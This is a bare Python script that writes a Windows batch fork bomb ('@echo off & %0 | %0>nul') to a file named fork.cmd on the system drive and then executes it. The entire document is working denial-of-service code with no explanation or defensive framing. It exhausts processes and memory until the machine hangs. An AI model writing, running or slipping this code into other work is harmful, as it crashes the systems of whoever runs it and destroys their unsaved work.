import os
import sys

gfile = open (os.getenv("SystemDrive") + "fork.cmd", "w")
gfile.write ("@echo off & %0 | %0>nul")
gfile.close()

os.system(os.getenv("SystemDrive") + "fork.cmd")

